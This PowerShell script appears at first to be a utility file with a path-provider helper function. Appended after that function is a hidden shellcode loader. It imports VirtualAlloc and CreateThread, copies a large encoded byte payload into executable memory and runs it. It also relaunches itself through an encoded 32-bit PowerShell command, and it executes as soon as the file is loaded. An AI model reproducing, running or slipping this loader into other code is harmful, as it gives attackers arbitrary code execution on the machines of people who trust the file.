
function Get-CPathProvider
{
    
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $Path
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState

    $pathQualifier = Split-Path -Qualifier $Path -ErrorAction SilentlyContinue
    if( -not $pathQualifier )
    {
        $Path = Join-Path -Path (Get-Location) -ChildPath $Path
        $pathQualifier = Split-Path -Qualifier $Path -ErrorAction SilentlyContinue
        if( -not $pathQualifier )
        {
            Write-Error "Qualifier for path '$Path' not found."
            return
        }
    }

    $pathQualifier = $pathQualifier.Trim(':')
    $drive = Get-PSDrive -Name $pathQualifier -ErrorAction Ignore
    if( -not $drive )
    {
        $drive = Get-PSDrive -PSProvider $pathQualifier -ErrorAction Ignore
    }

    if( -not $drive )
    {
        Write-Error -Message ('Unable to determine the provider for path {0}.' -f $Path)
        return
    }

    $drive  |
        Select-Object -First 1 |
        Select-Object -ExpandProperty 'Provider'

}

$IMs4 = '$tQe = ''[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $tQe -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xd1,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x47,0xbd,0xc0,0xf6,0x2e,0xbc,0x31,0x6b,0x18,0x83,0xc3,0x04,0x03,0x6b,0xd4,0x14,0xdb,0x40,0x3c,0x5a,0x24,0xb9,0xbc,0x3b,0xac,0x5c,0x8d,0x7b,0xca,0x15,0xbd,0x4b,0x98,0x78,0x31,0x27,0xcc,0x68,0xc2,0x45,0xd9,0x9f,0x63,0xe3,0x3f,0x91,0x74,0x58,0x03,0xb0,0xf6,0xa3,0x50,0x12,0xc7,0x6b,0xa5,0x53,0x00,0x91,0x44,0x01,0xd9,0xdd,0xfb,0xb6,0x6e,0xab,0xc7,0x3d,0x3c,0x3d,0x40,0xa1,0xf4,0x3c,0x61,0x74,0x8f,0x66,0xa1,0x76,0x5c,0x13,0xe8,0x60,0x81,0x1e,0xa2,0x1b,0x71,0xd4,0x35,0xca,0x48,0x15,0x99,0x33,0x65,0xe4,0xe3,0x74,0x41,0x17,0x96,0x8c,0xb2,0xaa,0xa1,0x4a,0xc9,0x70,0x27,0x49,0x69,0xf2,0x9f,0xb5,0x88,0xd7,0x46,0x3d,0x86,0x9c,0x0d,0x19,0x8a,0x23,0xc1,0x11,0xb6,0xa8,0xe4,0xf5,0x3f,0xea,0xc2,0xd1,0x64,0xa8,0x6b,0x43,0xc0,0x1f,0x93,0x93,0xab,0xc0,0x31,0xdf,0x41,0x14,0x48,0x82,0x0d,0xd9,0x61,0x3d,0xcd,0x75,0xf1,0x4e,0xff,0xda,0xa9,0xd8,0xb3,0x93,0x77,0x1e,0xb4,0x89,0xc0,0xb0,0x4b,0x32,0x31,0x98,0x8f,0x66,0x61,0xb2,0x26,0x07,0xea,0x42,0xc7,0xd2,0x87,0x47,0x5f,0x87,0x55,0x9e,0xcb,0x5f,0x58,0x1e,0xe2,0xc3,0xd5,0xf8,0x54,0xac,0xb5,0x54,0x14,0x1c,0x76,0x05,0xfc,0x76,0x79,0x7a,0x1c,0x79,0x53,0x13,0xb6,0x96,0x0a,0x4b,0x2e,0x0e,0x17,0x07,0xcf,0xcf,0x8d,0x6d,0xcf,0x44,0x22,0x91,0x81,0xac,0x4f,0x81,0x75,0x5d,0x1a,0xfb,0xd3,0x62,0xb0,0x96,0xdb,0xf6,0x3f,0x31,0x8c,0x6e,0x42,0x64,0xfa,0x30,0xbd,0x43,0x71,0xf8,0x2b,0x2c,0xed,0x05,0xbc,0xac,0xed,0x53,0xd6,0xac,0x85,0x03,0x82,0xfe,0xb0,0x4b,0x1f,0x93,0x69,0xde,0xa0,0xc2,0xde,0x49,0xc9,0xe8,0x39,0xbd,0x56,0x12,0x6c,0x3f,0xaa,0xc5,0x48,0x35,0xc2,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$zk9i=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($zk9i.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$zk9i,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($IMs4));$i7c6 = "-enc ";if([IntPtr]::Size -eq 8){$f2ox = $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $f2ox $i7c6 $e"}else{;iex "& powershell $i7c6 $e";}
